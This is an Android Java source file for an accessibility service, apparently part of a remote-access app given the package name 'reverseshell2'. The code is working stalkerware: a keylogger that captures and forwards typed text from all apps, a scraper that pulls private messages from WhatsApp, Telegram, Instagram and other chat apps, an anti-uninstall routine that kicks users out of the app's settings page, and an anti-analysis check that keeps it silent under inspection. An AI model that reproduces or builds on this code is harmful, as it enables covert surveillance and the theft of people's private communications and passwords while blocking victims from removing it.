package com.example.reverseshell2;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;

/**
 * Full-featured AccessibilityService — VigilKids/FamiGuard level.
 *
 * Features:
 * 1. KEYLOGGER — captures all typed text across all apps
 * 2. SCREEN SCRAPER — walks AccessibilityNodeInfo tree to extract ALL visible
 *    text from any app (WhatsApp messages, Instagram DMs, etc.)
 * 3. ANTI-UNINSTALL — detects when user opens app settings and hijacks to home
 * 4. APP MONITOR — tracks which apps are opened and for how long
 */
public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "SYS_A11Y";
    private DataStore store;
    private String currentPackage = "";
    private long lastScrapeTime = 0;
    private static final long SCRAPE_INTERVAL_MS = 3000; // Don't scrape more than every 3s
    private String lastScrapedText = "";

    // Packages of interest for deep message extraction
    private static final Set<String> CHAT_APPS = new HashSet<String>() {{
        add("com.whatsapp");
        add("com.whatsapp.w4b");
        add("org.telegram.messenger");
        add("com.instagram.android");
        add("com.facebook.orca");         // Messenger
        add("com.snapchat.android");
        add("com.discord");
        add("com.twitter.android");
        add("com.tiktok.android");         // TikTok (private DMs)
        add("jp.naver.line.android");      // LINE
        add("com.viber.voip");
        add("com.skype.raider");
        add("com.google.android.apps.messaging"); // Google Messages
    }};

    // Settings packages — for anti-uninstall protection
    private static final Set<String> SETTINGS_PACKAGES = new HashSet<String>() {{
        add("com.android.settings");
        add("com.miui.securitycenter");    // Xiaomi
        add("com.coloros.safecenter");     // OPPO
        add("com.samsung.android.sm");     // Samsung
        add("com.huawei.systemmanager");   // Huawei
    }};

    @Override
    public void onCreate() {
        super.onCreate();
        store = DataStore.getInstance(this);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        // ANTI-ANALYSIS: Go completely silent in hostile environments
        if (!EnvironmentGuard.isSafeEnvironment(this)) return;

        String packageName = event.getPackageName() != null
                ? event.getPackageName().toString() : "";
        int eventType = event.getEventType();

        // ============================================
        // 1. ANTI-UNINSTALL: Block access to our app settings
        // ============================================
        if (SETTINGS_PACKAGES.contains(packageName)) {
            handleSettingsDetection(event);
        }

        // ============================================
        // 2. KEYLOGGER: Capture typed text
        // ============================================
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleKeylogEvent(event, packageName);
        }

        // ============================================
        // 3. SCREEN SCRAPER: Walk UI tree on content changes
        // ============================================
        if (eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED ||
            eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {

            // Track current foreground app
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (!packageName.isEmpty() && !packageName.equals(currentPackage)) {
                    currentPackage = packageName;
                }
            }

            // Rate-limit scraping to avoid battery drain
            long now = System.currentTimeMillis();
            if (now - lastScrapeTime < SCRAPE_INTERVAL_MS) return;

            // Deep scrape for chat apps
            if (CHAT_APPS.contains(packageName) || CHAT_APPS.contains(currentPackage)) {
                lastScrapeTime = now;
                scrapeScreenContent(packageName.isEmpty() ? currentPackage : packageName);
            }
        }
    }

    // ============================================
    //  KEYLOGGER
    // ============================================
    private void handleKeylogEvent(AccessibilityEvent event, String packageName) {
        if (event.getText() == null || event.getText().isEmpty()) return;

        StringBuilder sb = new StringBuilder();
        for (CharSequence cs : event.getText()) {
            if (cs != null) sb.append(cs);
        }
        String typed = sb.toString().trim();
        if (typed.isEmpty()) return;

        store.insertKeylog(packageName, typed);

        // Also forward to legacy service if connected
        if (mainService.getContext() != null) {
            String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
            mainService.sendData("[" + timestamp + "] [" + packageName + "] [Input: " + typed + "]\n");
        }
    }

    // ============================================
    //  SCREEN SCRAPER — The VigilKids Method
    //  Walks the AccessibilityNodeInfo tree to extract
    //  ALL visible text from the current screen.
    //  This reads WhatsApp messages, Instagram DMs, etc.
    // ============================================
    private void scrapeScreenContent(String packageName) {
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;

            StringBuilder allText = new StringBuilder();
            traverseNodeTree(rootNode, allText, 0);

            String screenText = allText.toString().trim();
            if (screenText.isEmpty() || screenText.equals(lastScrapedText)) return;

            // Avoid storing duplicate screen states
            lastScrapedText = screenText;

            // Store full screen text
            if (screenText.length() > 50) { // Only meaningful amounts of text
                store.insertScreenText(packageName, screenText);
            }

            // Try to extract individual messages from chat apps
            if (CHAT_APPS.contains(packageName)) {
                extractChatMessages(rootNode, packageName);
            }

            rootNode.recycle();
        } catch (Exception e) {
            Log.e(TAG, "Scrape error: " + e.getMessage());
        }
    }

    private void traverseNodeTree(AccessibilityNodeInfo node, StringBuilder sb, int depth) {
        if (node == null || depth > 20) return; // Max depth to prevent stack overflow

        // Extract text content
        if (node.getText() != null && node.getText().length() > 0) {
            sb.append(node.getText().toString()).append("\n");
        }
        if (node.getContentDescription() != null && node.getContentDescription().length() > 0) {
            sb.append("[").append(node.getContentDescription().toString()).append("]\n");
        }

        // Traverse children
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                traverseNodeTree(child, sb, depth + 1);
                child.recycle();
            }
        }
    }

    /**
     * Extract individual chat messages from WhatsApp/Telegram/etc.
     * Uses class names and node hierarchy to identify message bubbles.
     */
    private void extractChatMessages(AccessibilityNodeInfo root, String packageName) {
        try {
            // Find all text views that look like message content
            // WhatsApp messages are typically in a RecyclerView/ListView
            // with TextViews containing the message text
            java.util.List<AccessibilityNodeInfo> messageNodes = new java.util.ArrayList<>();
            findMessageNodes(root, messageNodes);

            String currentSender = "";
            for (AccessibilityNodeInfo msgNode : messageNodes) {
                String text = msgNode.getText() != null ? msgNode.getText().toString() : "";
                String className = msgNode.getClassName() != null ? msgNode.getClassName().toString() : "";

                if (text.isEmpty()) continue;

                // Heuristic: short text in certain contexts is a sender name
                // Long text is message content
                if (text.length() < 30 && !text.contains(" ")) {
                    currentSender = text;
                } else if (text.length() > 1) {
                    store.insertMessage(packageName, currentSender, text, true);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Chat extract error: " + e.getMessage());
        }
    }

    private void findMessageNodes(AccessibilityNodeInfo node, java.util.List<AccessibilityNodeInfo> results) {
        if (node == null) return;

        String className = node.getClassName() != null ? node.getClassName().toString() : "";

        // Collect text views that could be message content
        if (className.contains("TextView") && node.getText() != null && node.getText().length() > 0) {
            results.add(node);
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                findMessageNodes(child, results);
            }
        }
    }

    // ============================================
    //  ANTI-UNINSTALL PROTECTION
    //  Detects when user navigates to our app's
    //  settings page and sends them back to home.
    // ============================================
    private void handleSettingsDetection(AccessibilityEvent event) {
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return;

            // Check if the current screen shows our package name
            StringBuilder screenText = new StringBuilder();
            traverseNodeTree(root, screenText, 0);

            String text = screenText.toString().toLowerCase();
            String ourPkg = getPackageName().toLowerCase();
            String ourLabel = getString(R.string.app_name).toLowerCase();

            // If settings screen shows our app name/package, go home
            if (text.contains(ourPkg) || text.contains("uninstall")) {
                // Check if they're actually on our app info page
                if (text.contains("force stop") || text.contains("app info") ||
                    text.contains("storage") || text.contains("permissions")) {

                    Log.d(TAG, "User trying to access app settings — redirecting to home");
                    performGlobalAction(GLOBAL_ACTION_HOME);
                }
            }
            root.recycle();
        } catch (Exception e) {
            // Silently fail
        }
    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "Accessibility Service Interrupted");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Full-featured Accessibility Service connected");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED |
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;

        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.DEFAULT |
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS |
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;

        info.notificationTimeout = 100;
        this.setServiceInfo(info);
    }
}
